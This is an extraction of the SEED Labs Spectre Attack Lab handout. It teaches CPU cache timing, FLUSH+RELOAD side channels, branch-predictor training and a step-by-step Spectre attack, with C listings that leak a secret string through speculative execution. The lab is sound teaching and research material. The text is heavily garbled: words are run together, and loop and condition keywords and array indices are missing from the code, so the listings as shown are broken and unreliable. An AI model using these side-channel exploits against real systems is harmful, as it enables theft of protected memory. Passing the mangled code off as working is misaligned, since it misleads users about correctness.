SEEDLabsŒSpectreAttackLab 1 SpectreAttackLab Copyright©2018WenliangDu SyracuseUniversity ThisworkislicensedunderaCreativeCommonsAttribution-NonCommercial-ShareAlike4.0International License.Ahuman-readablesummaryof andnotasubstitutefor thelicenseisthefollowing Youarefreeto copyandredistributethematerialinanymediumorformat.Youmustgiveappropriatecredit.Ifyouremix transform orbuilduponthematerial youmustdistributeyourcontributionsunderthesamelicenseasthe original.Youmaynotusethematerialforcommercialpurposes 1Introduction Discoveredin2017andpubliclydisclosedinJanuary2018 theSpectreattackexploitscriticalvulnerabilities existinginmanymodernprocessors includingthosefromIntel AMD andARM 1 .Thevulnerabilities allowaprogramtobreakinter-processandintra-processisolation soamaliciousprogramcanreadthe datafromtheareathatisnotaccessibletoit.Suchanaccessisnotallowedbythehardwareprotection mechanism forinter-processisolation orsoftwareprotectionmechanism forintra-prcessisolation buta vulnerabilityexistsinthedesignofCPUsthatmakesitpossibletodefeattheprotections.Becausethew existsinthehardware itisverydiftofundamentallytheproblem unlesswechangetheCPUsin ourcomputers.TheSpectrevulnerabilityrepresentsaspecialgenreofvulnerabilitiesinthedesignofCPUs AlongwiththeMeltdownvulnerability theyprovideaninvaluablelessonforsecurityeducation Thelearningobjective ofthislabisforstudentstogainexperiencesontheSpectreattack Theattackitselfisquitesophisticated sowebreakitdownintoseveralsmallsteps eachofwhichis easytounderstandandperform.Oncestudentsunderstandeachstep itshouldnotbedifforthemto puteverythingtogethertoperformtheactualattack.Thislabcoversanumberoftopicsdescribedinthe following Ł Spectreattack Ł Sidechannelattack Ł CPUcaching Ł Out-of-orderexecutionandbranchpredictioninsideCPUmicroarchitecture LabEnvironment Thislabhasbeentestedonourpre-builtUbuntu12.04VMandUbuntu16.04VM bothofwhichcanbedownloadedfromtheSEEDwebsite.TheUbuntu16.04VMisstillinthebetatesting stage sofrequentchangesareexpected.ItwillbeofreleasedinSummer2018fortheFallsemester Whenusingthislab instructorsshouldkeepthefollowingsinmind First althoughtheSpectrevulnerability isacommondesignwinsideIntel AMD andARMCPUs wehaveonlytestedthelabactivitiesonIntel CPUs.Second IntelisworkingonthisprobleminitsCPUs soifastudent'scomputerusesnewIntel CPUs theattackmaynotwork.Itisnotaproblemfornow February2018 butsixmonthsfromnow situationslikethismayarise Acknowledgment ThislabwasdevelopedwiththehelpofKuberKohliandHaoZhang graduatestudents intheDepartmentofElectricalEngineeringandComputerScienceatSyracuseUniversity SEEDLabsŒSpectreAttackLab 2 2CodeCompilation Formostofourtasks youneedtoadd -march=native whencompilingthecodewith gcc .The march tellsthecompilertoenableallinstructionsubsetssupportedbythelocalmachine.Forexample wecompile myprog.c usingthefollowingcommand $ gcc-march=native-omyprogmyprog.c 3Tasks1and2 SideChannelAttacksviaCPUCaches BoththeMeltdownandSpectreattacksuseCPUcacheasasidechanneltostealaprotectedsecret.The techniqueusedinthisside-channelattackiscalledFLUSH+RELOAD 2 .Wewillstudythistechnique Thecodedevelopedinthesetwotaskswillbeusedasabuildingblockinlatertasks ACPUcacheisahardwarecacheusedbytheCPUofacomputertoreducetheaveragecost timeor energy toaccessdatafromthemainmemory.AccessingdatafromCPUcacheismuchfasterthanaccessing fromthemainmemory.Whendataarefetchedfromthemainmemory theyareusuallycachedbytheCPU soifthesamedataareusedagain theaccesstimewillbemuchfaster.Therefore whenaCPUneedsto accesssomedata itrstlooksatitscaches.Ifthedataisthere thisiscalledcachehit itwillbefetched directlyfromthere.Ifthedataisnotthere thisiscalledmiss theCPUwillgotothemainmemorytoget thedata.Thetimespentinthelattercaseislonger.MostmodernCPUshaveCPUcaches Figure1 Cachehitandmiss 3.1Task1 ReadingfromCacheversusfromMemory Thecachememoryisusedtoprovidedatatothehighspeedprocessorsatafasterspeed.Thecache memoriesareveryfastcomparedtothemainmemory.Letusseethetimedifference.Inthefollow- ingcode CacheTime.c wehaveanarrayofsize 10 * 4096 .Weaccesstwoofitselements array 3 * 4096 array 7 * 4096 .Therefore thepagescontainingthesetwoelementswillbe cached.Wethenreadtheelementsfrom array 0 * 4096 array 9 * 4096 andmeasurethetime spentinthememoryreading.Figure1illustratesthedifference.Inthecode Line À readstheCPU'stimes- tamp TSC counterbeforethememoryread whileLine Á readsthecounterafterthememoryread.Their differenceisthetime intermsofnumberofCPUcycles spentinthememoryread.Itshouldbenotedthat cachingisdoneatthecacheblocklevel notatthebytelevel.Atypicalcacheblocksizeis64bytes.Weuse array k * 4096 sonotwoelementsusedintheprogramfallintothesamecacheblock SEEDLabsŒSpectreAttackLab 3 Listing1 CacheTime.c # include < emmintrin.h > # include < x86intrin.h > uint8_tarray 10 * 4096 intmain intargc constchar ** argv { intjunk=0 registeruint64_ttime1 time2 volatileuint8_t * addr inti //Initializethearray i=0 < 10 i++ array * 4096 =1 //FLUSHthearrayfromtheCPUcache i=0 < 10 i++ _mm_clflush & array * 4096 //Accesssomeofthearrayitems array 3 * 4096 =100 array 7 * 4096 =200 i=0 < 10 i++ { addr= & array * 4096 time1=__rdtscp & junk À junk= * addr time2=__rdtscp & junk -time1 Á printf `` Accesstimeforarray % * 4096 % dCPUcycles\n '' int time2 } return0 } Pleasecompilethefollowingcodeusing gcc-march=nativeCacheTime.c andrunit.Isthe accessof array 3 * 4096 array 7 * 4096 fasterthanthatoftheotherelements ? Youshould runtheprogramatleast10timesanddescribeyourobservations.Fromtheexperiment youneedtoa thresholdthatcanbeusedtodistinguishthesetwotypesofmemoryaccess accessingdatafromthecache versusaccessingdatafromthemainmemory.Thisthresholdisimportantfortherestofthetasksinthislab 3.2Task2 UsingCacheasaSideChannel Theobjectiveofthistaskistousethesidechanneltoextractasecretvalueusedbythevictimfunction Assumethereisavictimfunctionthatusesasecretvalueasindextoloadsomevaluesfromanarray.Also assumethatthesecretvaluecannotbeaccessedfromtheoutside.Ourgoalistousesidechannelstogetthis secretvalue.ThetechniquethatwewillbeusingiscalledFLUSH+RELOAD 2 .Figure2illustratesthe technique whichconsistsofthreesteps 1 FLUSHtheentirearrayfromthecachememorytomakesurethearrayisnotcached 2 Invokethevictimfunction whichaccessesoneofthearrayelementsbasedonthevalueofthesecret Thisactioncausesthecorrespondingarrayelementtobecached 3 RELOADtheentirearray andmeasurethetimeittakestoreloadeachelement.Ifone element'sloadingtimeisfast itisverylikelythatelementisalreadyinthecache.Thiselementmust betheoneaccessedbythevictimfunction.Therefore wecanoutwhatthesecretvalueis SEEDLabsŒSpectreAttackLab 4 Figure2 DiagramdepictingtheSideChannelAttack ThefollowingprogramusestheFLUSH+RELOADtechniquetooutaone-bytesecretvaluecon- tainedinthevariable secret .Sincethereare256possiblevaluesforaone-bytesecret weneedtomap eachvaluetoanarrayelement.Thenaivewayistoanarrayof256elements i.e. array 256 However thisdoesnotwork.Cachingisdoneatablocklevel notatabytelevel.If array k isac- cessed ablockofmemorycontainingthiselementwillbecached.Therefore theadjacentelementsof array k willalsobecached makingitdiftoinferwhatthesecretis.Tosolvethisproblem wecre- ateanarrayof 256 * 4096 bytes.EachelementusedinourRELOADstepis array k * 4096 .Because 4096 islargerthanatypicalcacheblocksize 64bytes notwodifferentelements array * 4096 array j * 4096 willbeinthesamecacheblock Since array 0 * 4096 mayfallintothesamecacheblockasthevariablesintheadjacentmemory itmaybeaccidentallycachedduetothecachingofthosevariables.Therefore weshouldavoidusing array 0 * 4096 intheFLUSH+RELOADmethod forotherindex k array k * 4096 doesnothave aproblem .Tomakeitconsistentintheprogram weuse array k * 4096+DELTA forall k values DELTA isasaconstant 1024 Listing2 FlushReload.c # include < emmintrin.h > # include < x86intrin.h > uint8_tarray 256 * 4096 inttemp charsecret=94 * cachehittimethresholdassumed * # defineCACHE_HIT_THRESHOLD 80 # defineDELTA1024 voidflushSideChannel { inti //WritetoarraytobringittoRAMtopreventCopy-on-write i=0 < 256 i++ array * 4096+DELTA =1 SEEDLabsŒSpectreAttackLab 5 //Flushthevaluesofthearrayfromcache i=0 < 256 i++ _mm_clflush & array * 4096+DELTA } voidvictim { temp=array secret * 4096+DELTA } voidreloadSideChannel { intjunk=0 registeruint64_ttime1 time2 volatileuint8_t * addr inti i=0 < 256 i++ { addr= & array * 4096+DELTA time1=__rdtscp & junk junk= * addr time2=__rdtscp & junk -time1 time2 < =CACHE_HIT_THRESHOLD { printf `` array % * 4096+ % isincache.\n '' DELTA printf `` TheSecret= % d.\n '' } } } intmain intargc constchar ** argv { flushSideChannel victim reloadSideChannel return 0 } Pleasecompiletheprogramusingandrunit seeSection2forcompilationinstruction .Itshouldbe notedthatthetechniqueisnot100percentaccurate andyoumaynotbeabletoobservetheexpectedoutput allthetime.Runtheprogramforatleast20times andcounthowmanytimesyouwillgetthesecret correctly.Youcanalsoadjustthethreshold CACHE HIT THRESHOLD totheonederivedfromTask1 80 isusedinthiscode 4Task3 Out-of-OrderExecutionandBranchPrediction Theobjectiveofthistaskistounderstandtheout-of-orderexecutioninCPUs.Wewilluseanexperimentto helpstudentsobservesuchkindofexecution 4.1Out-Of-OrderExecution TheSpectreattackreliesonanimportantfeatureimplementedinmostCPUs.Tounderstandthisfeature let usseethefollowingcode.Thiscodecheckswhether x islessthan size ifso thevariable data willbe updated.Assumethatthevalueof size is10 soif x equals 15 thecodeinLine3willnotbeexecuted SEEDLabsŒSpectreAttackLab 6 1data=0 2if x < size { 3data=data+5 4 } TheabovestatementaboutthecodeexampleistruewhenlookingfromoutsideoftheCPU.However isnotcompletelytrueifwegetintotheCPU andlookattheexecutionsequenceatthemicroarchitectural level.Ifwedothat wewilloutthatLine3maybesuccessfullyexecutedeventhoughthevalueof x largerthan size .ThisisduetoanimportantoptimizationtechniqueadoptedbymodernCPUs.Itiscalled out-of-orderexecution Out-of-orderexecutionisanoptimizationtechniquethatallowsCPUtomaximizetheutilizationofall itsexecutionunits.Insteadofprocessinginstructionsstrictlyinasequentialorder aCPUexecutesthemin parallelassoonasallrequiredresourcesareavailable.Whiletheexecutionunitofthecurrentoperationis occupied otherexecutionunitscanrunahead Inthecodeexampleabove atthemicroarchitecturallevel Line2involvestwooperations loadthevalue size fromthememory andcomparethevaluewith x .If size isnotintheCPUcaches itmaytake hundredsofCPUclockcyclesbeforethatvalueisread.Insteadofsittingidle modernCPUstrytopredict theoutcomeofthecomparison andspeculativelyexecutethebranchesbasedontheestimation.Sincesuch executionstartsbeforethecomparisoneventheexecutioniscalledout-of-orderexecution.Before doingtheout-of-orderexecution theCPUstoresitscurrentstateandvalueofregisters.Whenthevalue size arrives theCPUwillchecktheactualoutcome.Ifthepredictionistrue thespeculatively performedexecutioniscommittedandthereisaperformancegain.Ifthepredictioniswrong theCPUwillrevertbacktoitssavedstate soalltheresultsproducedbytheout-of-orderexecutionwill bediscardedlikeithasneverhappened.ThatiswhyfromoutsideweseethatLine3wasneverexecuted Figure3illustratestheout-of-orderexecutioncausedbyLine2ofthesamplecode Figure3 Speculativeexecution out-of-orderexecution IntelandseveralCPUmakersmadeaseveremistakeinthedesignoftheout-of-orderexecution.They wipeouttheeffectsoftheout-of-orderexecutiononregistersandmemoryifsuchanexecutionisnot supposedtohappen sotheexecutiondoesnotleadtoanyvisibleeffect.However theyforgotonething theeffectonCPUcaches.Duringtheout-of-orderexecution thereferencedmemoryisfetchedintoa registerandisalsostoredinthecache.Iftheresultsoftheout-of-orderexecutionhavetobediscarded cachingcausedbytheexecutionshouldalsobediscarded.Unfortunately thisisnotthecaseinmostCPUs SEEDLabsŒSpectreAttackLab 7 Therefore itcreatesanobservableeffect.Usingtheside-channeltechniquedescribedinTasks1and2 wecanobservesuchaneffect.TheSpectreattackcleverlyusesthisobservableeffecttooutprotected secretvalues 4.2TheExperiment Inthistask weuseanexperimenttoobservetheeffectcausedbyanout-of-orderexecution.Thecodeused inthisexperimentisshownbelow.Someofthefunctionsusedinthecodeisthesameasthatintheprevious tasks sotheywillnotberepeated Listing3 SpectreExperiment.c # include < emmintrin.h > # include < x86intrin.h > intsize=10 uint8_tarray 256 * 4096 uint8_ttemp=0 # defineCACHE_HIT_THRESHOLD 80 # defineDELTA1024 voidvictim size_tx { x < size { À temp=array x * 4096+DELTA Á } } intmain { inti //FLUSHtheprobingarray flushSideChannel //TraintheCPUtotakethetruebranchinsidevictim i=0 < 10 i++ { Â _mm_clflush & size P victim Ã } //Exploittheout-of-orderexecution _mm_clflush & size P i=0 < 256 i++ _mm_clflush & array * 4096+DELTA victim 97 Ä //RELOADtheprobingarray reloadSideChannel return 0 } SEEDLabsŒSpectreAttackLab 8 ForCPUstoperformaspeculativeexecution theyshouldbeabletopredicttheoutcomeoftheif condition.CPUskeeparecordofthebranchestakeninthepast andthenusethesepastresultstopredict whatbranchshouldbetakeninaspeculativeexecution.Therefore ifwewouldlikeaparticularbranchtobe takeninaspeculativeexecution weshouldtraintheCPU soourselectedbranchcanbecometheprediction result.Thetrainingisdoneinthe loopstartingfromLine Â .Insidetheloop weinvoke victim withasmallargument from0to9 .Thesevaluesarelessthanthevalue size sothetrue-branchofthe if-conditioninLine À isalwaystaken.Thisisthetrainingphase whichessentiallytrainstheCPUtoexpect theif-conditiontocomeouttobetrue OncetheCPUistrained wepassalargervalue 97 tothe victim function Line Ä .Thisvalue islargerthan size sothefalse-branchoftheif-conditioninside victim willbetakenintheactual execution notthetrue-branch.However wehavethevariable size fromthememory sogettingits valuefromthememorymaytakeawhile.ThisiswhentheCPUwillmakeaprediction andstartspeculative execution 4.3Task3 Pleasecompilethe SpectreExperiment.c programshowninListing3 seeSection2forthecompi- lationinstruction runtheprogramanddescribeyourobservations.Theremaybesomenoiseintheside channelduetoextrathingscachedbytheCPU wewillreducethenoiselater butfornowyoucanexecute thetaskmultipletimestoobservetheeffects.PleaseobservewhetherLine Á isexecutedornotwhen 97 fedinto victim .Pleasealsodothefollowings Ł Commentoutthelinesmarkedwith P andexecuteagain.Explainyourobservation.Afteryouare donewiththisexperiment uncommentthem sothesubsequenttasksarenotaffected Ł ReplaceLine Ã victim i+20 runthecodeagainandexplainyourobservation 5Task4 TheSpectreAttack Aswehaveseenfromtheprevioustask wecangetCPUstoexecuteatrue-branchofanifstatement even thoughtheconditionisfalse.Ifsuchanout-of-orderexecutiondoesnotcauseanyvisibleeffect itisnota problem.However mostCPUswiththisfeaturedonotcleanthecache sosometracesoftheout-of-order executionisleftbehind.TheSpectreattackusesthesetracestostealprotectedsecrets Thesesecretscanbedatainanotherprocessordatainthesameprocess.Ifthesecretdataisinanother process theprocessisolationatthehardwarelevelpreventsaprocessfromstealingdatafromanother process.Ifthedataisinthesameprocess theprotectionisusuallydoneviasoftware suchassandbox mechanisms.TheSpectreattackcanbelaunchedagainstbothtypesofsecret.However stealingdatafrom anotherprocessismuchharderthanstealingdatafromthesameprocess.Forthesakeofsimplicity thislab onlyfocusesonstealingdatafromthesameprocess Whenwebpagesfromdifferentserversareopenedinsideabrowser theyareoftenopenedinthesame process.Thesandboximplementedinsidethebrowserwillprovideanisolatedenvironmentforthesepages soonepagewillnotbeabletoaccessanotherpage'sdata.Mostsoftwareprotectionsrelyoncondition checkstodecidewhetheranaccessshouldbegrantedornot.WiththeSpectreattack wecangetCPUsto execute out-of-order aprotectedcodebrancheveniftheconditionchecksfails essentiallydefeatingthe accesscheck SEEDLabsŒSpectreAttackLab 9 Figure4 Experimentsetup thebufferandtheprotectedsecret 5.1TheSetupfortheExperiment Figure4illustratesthesetupfortheexperiment.Inthissetup therearetworegions arestrictedregionand anon-restrictedregion.Therestrictionisachievedviaanif-conditionimplementedinasandboxfunction describedbelow.Thesandboxfunctionreturnsthevalueof buffer x fora x valueprovidedbyusers onlyif x islessthanthesizeofthebuffer otherwise nothingisreturned.Therefore thissandboxfunction willneverreturnanythingintherestrictedareatousers unsignedintbuffer_size=10 uint8_tbuffer 10 = { 0,1,2,3,4,5,6,7,8,9 } uint8_trestrictedAccess size_tx { x < buffer_size { returnbuffer x } else { return0 } } Thereisasecretvalueintherestrictedarea theaddressofwhichisknowntotheattacker.However theattackercannotdirectlyaccessthememoryholdingthesecretvalue theonlywaytoaccessthesecretis throughtheabovesandboxfunction.Fromtheprevioustask wehavelearnedthatalthoughthetrue-branch willneverbeexecutedif x islargerthanthebuffersize atmicroarchitecturallevel itcanbeexecutedand sometracescanbeleftbehindwhentheexecutionisreverted 5.2TheProgramUsedintheExperiment ThecodeforthebasicSpectreattackisshownbelow.Inthiscode thereisasecretinLine À Assumethatwecannotdirectlyaccessthe secret variableorthe buffer size variable wedoassume thatwecan buffer size fromthecache .OurgoalistoprintoutthesecretusingtheSpectreattack SEEDLabsŒSpectreAttackLab 10 Thecodebelowonlystealsthebyteofthesecret.Studentscanextendittoprintoutmorebytes Listing4 SpectreAttack.c # defineDELTA1024 unsignedintbuffer_size=10 uint8_tbuffer 10 = { 0,1,2,3,4,5,6,7,8,9 } uint8_ttemp=0 char * secret= '' SomeSecretValue '' À uint8_tarray 256 * 4096 //SandboxFunction uint8_trestrictedAccess size_tx { x < buffer_size { returnbuffer x } else { return0 } } voidspectreAttack size_tlarger_x { inti uint8_ts //TraintheCPUtotakethetruebranchinsiderestrictedAccess i=0 < 10 i++ { restrictedAccess } //Flushbuffer_sizeandarray fromthecache _mm_clflush & buffer_size i=0 < 256 i++ { _mm_clflush & array * 4096+DELTA } //AskrestrictedAccess toreturnthesecretinout-of-orderexecution s=restrictedAccess larger_x Á array * 4096+DELTA +=88 Â } intmain { flushSideChannel size_tlarger_x= size_t secret- char * buffer Ã spectreAttack larger_x reloadSideChannel return 0 } MostofthecodeisthesameasthatinListing3 sowewillnotrepeattheirexplanationhere.The mostimportantpartisinLines Á Â Ã .Line Ã calculatestheoffsetofthesecretfromthebeginning ofthebuffer weassumethattheaddressofthesecretisknowntotheattacker inrealattacks thereare manywaysforattackerstoouttheaddress includingguessing .Theoffset whichislarger than10 isfedintothe restrictedAccess function.BecausewehavetrainedtheCPUtotakethe SEEDLabsŒSpectreAttackLab 11 true-branchinside restrictedAccess theCPUwillreturn buffer larger x whichcontains thevalueofthesecret intheout-of-orderexecution.Thesecretvaluethencausesitscorrespondingelement array tobeloadedintocache.Allthesestepswilleventuallybereverted sofromoutside onlyzero isreturnedfrom restrictedAccess notthevalueofthesecret.However thecacheisnotcleaned array * 4096+DELTA isstillkeptinthecache.Now wejustneedtousetheside-channel techniquetooutwhichelementofthe array isinthecache TheTask Pleasecompileandexecute SpectreAttack.c .Describeyourobservationandnotewhether youareabletostealthesecretvalue.Ifthereisalotofnoiseinthesidechannel youmaynotgetconsistent resultseverytime.Toovercomethis youshouldexecutetheprogrammultipletimesandseewhetheryou cangetthesecretvalue 6Task5 ImprovetheAttackAccuracy Intheprevioustasks itmaybeobservedthattheresultsdohavesomenoiseandtheresultsarenotalways accurate.ThisisbecauseCPUsometimesloadextravaluesincacheexpectingthatitmightbeusedatsome laterpoint orthethresholdisnotveryaccurate.Thisnoiseincachecanaffecttheresultsofourattack.We needtoperformtheattackmultipletimes insteadofdoingitmanually wecanusethefollowingcodeto performthetaskautomatically Webasicallyuseastatisticaltechnique.Theideaistocreateascorearrayofsize256 oneelementfor eachpossiblesecretvalue.Wethenrunourattackformultipletimes.Eachtime ifourattackprogramsays k isthesecret thisresultmaybefalse weadd 1 scores k .Afterrunningtheattackformany times weusethevalue k withthehighestscoreasourestimationofthesecret.Thiswillproducea muchreliableestimationthantheonebasedonasinglerun.Therevisedcodeisshowninthefollowing Listing5 SpectreAttackImproved.c staticintscores 256 voidreloadSideChannelImproved { inti volatileuint8_t * addr registeruint64_ttime1 time2 intjunk=0 i=0 < 256 i++ { addr= & array * 4096+DELTA time1=__rdtscp & junk junk= * addr time2=__rdtscp & junk -time1 time2 < =CACHE_HIT_THRESHOLD scores ++ * ifcachehit add1forthisvalue * } } voidspectreAttack size_tlarger_x { inti uint8_ts SEEDLabsŒSpectreAttackLab 12 i=0 < 256 i++ { _mm_clflush & array * 4096+DELTA } //TraintheCPUtotakethetruebranchinsidevictim i=0 < 10 i++ { _mm_clflush & buffer_size restrictedAccess } //Flushbuffer_sizeandarray fromthecache _mm_clflush & buffer_size i=0 < 256 i++ { _mm_clflush & array * 4096+DELTA } //Askvictim toreturnthesecretinout-of-orderexecution s=restrictedAccess larger_x array * 4096+DELTA +=88 } intmain { inti uint8_ts size_tlarger_x= size_t secret- char * buffer flushSideChannel i=0 < 256 i++ scores =0 i=0 < 1000 i++ { spectreAttack larger_x reloadSideChannelImproved } intmax=0 i=0 < 256 i++ { scores max < scores max=i } printf `` Readingsecretvalueat % p= '' void * larger_x printf `` Thesecretvalueis % d\n '' max printf `` Thenumberofhitsis % d\n '' scores max return 0 } Youmayobservethatwhenrunningthecodeabove theonewiththehighestscoreisalways scores 0 Pleaseoutthereason andthecodeabove sotheactualsecretvalue whichisnotzero willbe printedout 7Task6 StealtheEntireSecretString Intheprevioustask wejustreadthecharacterofthe secret string.Inthistask weneedtoprintout theentirestringusingtheSpectreattack.PleasewriteyourowncodeorextendthecodeinTask5 include yourexecutionresultsinthereport SEEDLabsŒSpectreAttackLab 13 8Submission Youneedtosubmitadetailedlabreport withscreenshots todescribewhatyouhavedoneandwhatyou haveobserved.Youalsoneedtoprovideexplanationtotheobservationsthatareinterestingorsurprising Pleasealsolisttheimportantcodesnippetsfollowedbyexplanation.Simplyattachingcodewithoutany explanationwillnotreceivecredits References 1 PaulKocher DanielGenkin DanielGruss WernerHaas MikeHamburg MoritzLipp StefanMan- gard ThomasPrescher MichaelSchwarz andYuvalYarom.Spectreattacks Exploitingspeculative execution ArXive-prints January2018 2 YuvalYaromandKatrinaFalkner.Flush+reload Ahighresolution lownoise l3cacheside-channel attack.In Proceedingsofthe23rdUSENIXConferenceonSecuritySymposium SEC'14 pages719Œ 732 Berkeley CA USA,2014.USENIXAssociation 